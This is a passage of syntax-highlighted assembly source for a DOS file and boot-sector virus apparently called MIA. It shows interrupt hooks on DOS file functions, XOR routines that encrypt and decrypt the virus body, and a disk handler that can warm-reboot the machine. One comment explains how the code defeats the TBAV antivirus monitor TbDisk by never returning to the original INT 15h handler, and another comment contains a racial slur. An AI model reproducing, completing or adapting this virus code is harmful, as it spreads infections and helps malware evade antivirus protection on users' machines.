 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">56h</span><span class="sc0">                    </span><span class="sc1">; Rename file at DS:DX into name at ES:[DI]</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multitude</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">57h</span><span class="sc0">                    </span><span class="sc1">; Get/set file time/date stamps</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Stamp</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">5Bh</span><span class="sc0">                    </span><span class="sc1">; Create a new file (stall if it exists)</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Creative</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">60h</span><span class="sc0">                    </span><span class="sc1">; Canonize filename/path at DS:[SI]</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Canonicalization</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">                    </span><span class="sc1">; Set file handle count</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Removable</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">6Ch</span><span class="sc0">                    </span><span class="sc1">; Extended open/create file with BL = open mode</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Creative</span><span class="sc0">

</span><span class="sc5">Flop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Put return IP in AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                  </span><span class="sc1">; Point BP to stack pointer</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Restore AX and replace with return IP</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">              
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Scramble</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Cloak</span><span class="sc0">

</span><span class="sc5">ExOr</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">1983h</span><span class="sc0"> </span><span class="sc1">; Don't set this value to zero!</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Beg_Cloak</span><span class="sc0">    </span><span class="sc1">; Done encrypting/decrypting?</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">ExOr</span><span class="sc0">                   </span><span class="sc1">; Loop...</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Freeware</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Rapidformat</span><span class="sc4">],</span><span class="sc2">0A8h</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Restorage</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Restore INT 15h vector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Vectorize</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">Revector</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; This is MIA's interrupt swapper</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; But this will set and return the current</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; segment:offset = CX:DX</span><span class="sc0">
 </span><span class="sc6">mul</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; Offset of interrupt number in AL</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Segment of interrupt number in AL</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Junkie</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Encryptor/decryptor for boot</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">

</span><span class="sc5">Polynomial</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">

</span><span class="sc5">Phreak</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; Hack!</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; Ah... just a little bit robust</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Phreak</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                          </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Hinc</span><span class="sc0"> </span><span class="sc5">ducitur</span><span class="sc0"> </span><span class="sc5">honos</span><span class="sc0">!


</span><span class="sc5">Evoke</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Encrypt body, write to disk, and decrypt</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Junkie</span><span class="sc0">                 </span><span class="sc1">; First, encrypting...</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">9Ah</span><span class="sc0">
 </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0F000B3D4h</span><span class="sc0">             </span><span class="sc1">; Call disk I/O</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; Save flags state</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Junkie</span><span class="sc0">                 </span><span class="sc1">; Decrypt virus body</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                           

</span><span class="sc5">Backbreak</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3301h</span><span class="sc0">               </span><span class="sc1">; DOS func. AX=3301h, set extended BREAK state</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; DL=00 ƒƒƒ OFF, DL=01 ƒƒƒ ON</span><span class="sc0">

</span><span class="sc5">Breakstate</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 18h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Slick</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; MIA's INT 13h goes here</span><span class="sc0">

</span><span class="sc5">ROM_BIOS</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0F000B3D4h</span><span class="sc0">         </span><span class="sc1">; This is the BIOS disk interrupt handler</span><span class="sc0">

</span><span class="sc5">Transpire</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; DX = virus segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                  </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; SS:[BP+06h] = interrupt caller's segment</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Recognize</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0000h</span><span class="sc0">                  </span><span class="sc1">; If differs, warm-reboot the machine</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0472h</span><span class="sc4">],</span><span class="sc2">1234h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Collide</span><span class="sc0">                </span><span class="sc1">; Disable FD (if a HD exists)</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">
 </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0F000FFF0h</span><span class="sc0">             </span><span class="sc1">; JMP F000:FFF0</span><span class="sc0">

</span><span class="sc5">Recognize</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Positive or negative?</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Slick</span><span class="sc0">

</span><span class="sc5">Into_Disk</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; Floppy disks goes here (INT 40h)</span><span class="sc0">

</span><span class="sc5">Flop_BIOS</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0F000EC59h</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 15h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; MIA hooks INT 15h during infection attempt, uhhm... apparently meaningless?</span><span class="sc0">
</span><span class="sc1">; but the purpose is bypassing one of TBAV resident monitor, that is TbDisk!!</span><span class="sc0">
</span><span class="sc1">; hex! this program again! TbDisk's INT 15h handler tests a flag when INT 15h</span><span class="sc0">
</span><span class="sc1">; is called with AH=90h, (i.e. disk access permission flag) set alarm flag if</span><span class="sc0">
</span><span class="sc1">; INT 15h is called without a certain bit set, and the TbDisk INT 21h handler</span><span class="sc0">
</span><span class="sc1">; will check this alarm flag and if set, display message: "A disk is accessed</span><span class="sc0">
</span><span class="sc1">; via an unusual way ... blah blah blah ..." but why INT 15h? 'n not INT 13h?</span><span class="sc0">
</span><span class="sc1">; 'cause ROM BIOS disk handler,  that is INT 13h ROM entry point, invokes INT</span><span class="sc0">
</span><span class="sc1">; 15h every busy time  (i.e. waiting for response  from disk, etc.)  so every</span><span class="sc0">
</span><span class="sc1">; program  that invokes INT 13h,  will execute INT 15h too! to bypass this, I</span><span class="sc0">
</span><span class="sc1">; only knew two way: first,  perform direct disk access via controller port -</span><span class="sc0">
</span><span class="sc1">; this is not efficient at all - the virus will be too complex and large, the</span><span class="sc0">
</span><span class="sc1">; second way is much easier, that is what MIA does,  never return to original</span><span class="sc0">
</span><span class="sc1">; INT 15h!!! since BIOSes don't do anything but clear AH &amp; CF, then return to</span><span class="sc0">
</span><span class="sc1">; interrupt caller (AH=90h), but if there's another way Ya know to avoid this</span><span class="sc0">
</span><span class="sc1">; nigga, I'd love to hear!! 8-)</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Disk_IO</span><span class="sc4">:</span><span class="sc0">                       
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                 </span><span class="sc1">; AT/PS device busy call?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Wasted</span><span class="sc0">                 </span><span class="sc1">; Don't bother if not!</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; This clears AH and CF, and sets ZF</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; Enable interrupts</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">   </span><span class="sc2">0002h</span><span class="sc0">                  </span><span class="sc1">; Return to interrupt caller, no popping flags</span><span class="sc0">

</span><span class="sc5">Wasted</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; Far JMP opcode</span><span class="sc0">
                               </span><span class="sc1">; Blazin'!!! the handler ends here, very short!</span><span class="sc0">
</span><span class="sc5">Decryptor</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; The codes below are useless, since they will</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0CDDAh</span><span class="sc0">              </span><span class="sc1">; only executed in first virus generation</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Returned</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1762h</span><span class="sc0">               </span><span class="sc1">; AX = DAB8</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirEnd</span><span class="sc0">       </span><span class="sc1">; Blah... blah... blah... stupid codes that</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; unexpectedly beat TBAV pretty hard, 8-)</span><span class="sc0">
 </span><span class="sc6">std</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">36h</span><span class="sc0">                    </span><span class="sc1">; SS:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">                         
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Set up the real stack</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Mutant</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Vanguard</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">2710h</span><span class="sc0">

</span><span class="sc5">VirEnd</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; Far JMP opcode</span><span class="sc0">

</span><span class="sc5">Viral_Interrupt</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00C90FB4h</span><span class="sc0">
</span><span class="sc5">Interstice</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">Fake_ROM</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Button</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Prebuff</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Replacement</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Slack</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0">             </span><span class="sc1">; Trash!</span><span class="sc0">

     </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">IO_Cassette</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0F000F859h</span><span class="sc0"> </span><span class="sc1">; Original (may be TbDisk's) INT 15h handler is</span><span class="sc0">
                               </span><span class="sc1">; saved here.</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">311h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Below is the host program ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Stub</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; Hmm, I put a worthwhile stuff here: display</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">; calculated (decimal) virus length</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">              </span><span class="sc1">; Put virus length into AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">000Ah</span><span class="sc0">               </span><span class="sc1">; Set up divisor</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Virsize</span><span class="sc0">      </span><span class="sc1">; Buffer to put result</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">Remainder</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; AX / BX</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; Convert to decimal - OR 30h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">             </span><span class="sc1">; Put the ASCII character</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
